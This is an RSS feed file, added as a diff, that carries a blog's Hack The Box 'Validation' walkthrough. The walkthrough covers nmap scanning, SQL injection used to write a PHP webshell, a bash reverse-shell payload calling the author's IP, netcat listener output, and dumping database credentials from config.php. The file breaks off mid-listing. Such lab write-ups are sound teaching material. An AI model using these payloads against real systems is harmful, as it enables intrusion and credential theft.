@@ -1,0 +1,203 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Terminal</title>
+    <link>https://theloganlab.github.io/posts/</link>
+    <description>Recent content in Posts on Terminal</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 22 Jun 2022 21:03:46 -0500</lastBuildDate><atom:link href="https://theloganlab.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Validation</title>
+      <link>https://theloganlab.github.io/posts/validation/</link>
+      <pubDate>Wed, 22 Jun 2022 21:03:46 -0500</pubDate>
+      
+      <guid>https://theloganlab.github.io/posts/validation/</guid>
+      <description>Validation is a Hack The Box machine ranked easy.
+Its main challenge is SQL Injection where we&amp;rsquo;re going to be able to write a webshell into the web server.
+Nmap scan With nmap we will find opened ports and examinate them:
+❯ nmap -p- -sS --min-rate 5000 --open -n -Pn 10.129.84.93 -oG allPorts We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:</description>
+      <content>&lt;p&gt;&lt;strong&gt;Validation&lt;/strong&gt; is a Hack The Box machine ranked easy.&lt;/p&gt;
+&lt;p&gt;Its main challenge is &lt;strong&gt;SQL Injection&lt;/strong&gt; where we&amp;rsquo;re going to be able to write a &lt;strong&gt;webshell&lt;/strong&gt; into the web server.&lt;/p&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;Nmap scan&lt;/h1&gt;
+&lt;p&gt;With &lt;strong&gt;nmap&lt;/strong&gt; we will find opened ports and examinate them:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nmap -p- -sS --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt; --open -n -Pn 10.129.84.93 -oG allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Here you have an useful function you can use for this manner&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+extractPorts () {
+	ports=&amp;#34;$(cat $1 | grep -oP &amp;#39;\d{1,5}/open&amp;#39; | awk &amp;#39;{print $1}&amp;#39; FS=&amp;#39;/&amp;#39; | xargs | tr &amp;#39; &amp;#39; &amp;#39;,&amp;#39;)&amp;#34;
+	ip_address=&amp;#34;$(cat $1 | grep initiated | awk &amp;#39;NF{print $NF}&amp;#39;)&amp;#34;
+	echo -e &amp;#34;\n[*] Extracting information...\n&amp;#34; &amp;gt; extractPorts.tmp
+	echo -e &amp;#34;\t[*] IP Address: $ip_address&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	echo -e &amp;#34;\t[*] Open ports: $ports\n&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	echo $ports | tr -d &amp;#39;\n&amp;#39; | xclip -sel clip
+	echo -e &amp;#34;[*] Ports copied to clipboard\n&amp;#34; &amp;gt;&amp;gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ extractPorts allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Extracting information...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP Address: 10.129.84.93
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Open ports: 22,80,4566,8080
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have the opened ports we can examinate them deeply.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sCV -p 22,80,4566.8080 -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-06-23 12:55 -05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.84.93
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT     STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp   open  http    Apache httpd 2.4.48 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;UTF-8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.48 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4566/tcp open  http    nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt; Forbidden
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8080/tcp open  http    nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: &lt;span style=&#34;color:#ae81ff&#34;&gt;502&lt;/span&gt; Bad Gateway
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 17.98 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Port 80&lt;/strong&gt; is opened with a &lt;strong&gt;http&lt;/strong&gt; service, we can make a quick inspection with &lt;strong&gt;whatweb&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ whatweb http://10.129.85.93
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://10.129.84.93 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Apache&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2.4.48&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, Bootstrap, Country&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;RESERVED&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;ZZ&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, HTTPServer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Debian Linux&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;Apache/2.4.48 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IP&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;10.129.84.93&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, JQuery, PHP&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;7.4.23&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, Script, X-Powered-By&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;PHP/7.4.23&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We don&amp;rsquo;t get much information so it&amp;rsquo;s time to visit the page:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/sc3.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;It&amp;rsquo;s a register panel that doesn&amp;rsquo;t seem to do much&amp;hellip;&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/test.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We will intercept the register request with &lt;strong&gt;Burpsuite&lt;/strong&gt; so we can do some tests.
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-2.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;After a simple test we see how the &lt;em&gt;country&lt;/em&gt; field is vulnerable to &lt;strong&gt;SQLI&lt;/strong&gt;:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-1.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;We could look for credentials in the dabatase but we can also check if we can write files:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-3.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;We will test this by writing &amp;ldquo;test&amp;rdquo; into /var/www/html/test.txt which is the default route where the website files are located:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-4.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;And it works!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Wappalyzer&lt;/strong&gt; shows us the programming language used by the website:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-5.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;So now we can write a simple web shell in &lt;strong&gt;php&lt;/strong&gt; and get &lt;strong&gt;Remote Command Execution.&lt;/strong&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-6.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;This script will create a &lt;strong&gt;webshell&lt;/strong&gt; in &lt;strong&gt;/shell.php&lt;/strong&gt; which takes the parameter &lt;strong&gt;cmd&lt;/strong&gt; to execute commands:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-7.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;Now we can get a reverse shell with this payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.161/334 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we specify our &lt;strong&gt;IP address&lt;/strong&gt; and the &lt;strong&gt;port&lt;/strong&gt; where we&amp;rsquo;re going to set the listener.&lt;/p&gt;
+&lt;p&gt;As we are sending this payload over &lt;strong&gt;URL&lt;/strong&gt; the &lt;strong&gt;&amp;rsquo;&amp;amp;&amp;rsquo;&lt;/strong&gt; might give us syntax problems so we will url-encode this character as &lt;strong&gt;%26&lt;/strong&gt;:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/val-9.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;Now we check our listener and we wait for the connection:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Version 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Listening on :::334
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Listening on 0.0.0.0:334
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Connection from 10.129.83.187.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Connection from 10.129.83.187:46728.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash: cannot set terminal process group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; device
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash: no job control in this shell
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have a shell but not a &lt;strong&gt;tty&lt;/strong&gt; so we will do a &lt;strong&gt;tty treatment&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ script /dev/null -c bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;script /dev/null -c bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Script started, output log file is &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/dev/null&amp;#39;&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ ^Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zsh: suspended  nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ stty raw -echo; fg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  + continued  nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                              reset
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reset: unknown terminal type unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Terminal type? xterm
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And finally the last touches.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ export SHELL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xterm
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ stty rows &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; columns &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This way we will have the correct screen size (you can find your own with &lt;code&gt;stty size&lt;/code&gt;) and we are also able to do ^L.&lt;/p&gt;
+&lt;p&gt;Now that we have everything set we look for the &lt;strong&gt;user flag&lt;/strong&gt; and start the enumeration:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ cd /home
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/home$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/home$ cd htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/home/htb$ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;18ed73a646e875a23aaaa1**********
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nice, we found the &lt;strong&gt;user.txt&lt;/strong&gt; now we can move on.&lt;/p&gt;
+&lt;p&gt;Inside &lt;strong&gt;/var/www/html&lt;/strong&gt; we find this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;account.php  config.php  css  index.php  js
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There&amp;rsquo;s a configuration file, which are usually very interesting and might contain credentials:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@validation:/var/www/html$ cat config.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $servername &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uhc&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uhc-9qual-global-pw&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $dbname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registration&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $conn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new mysqli&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$servername, $username, $password, $dbname&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?&amp;gt;
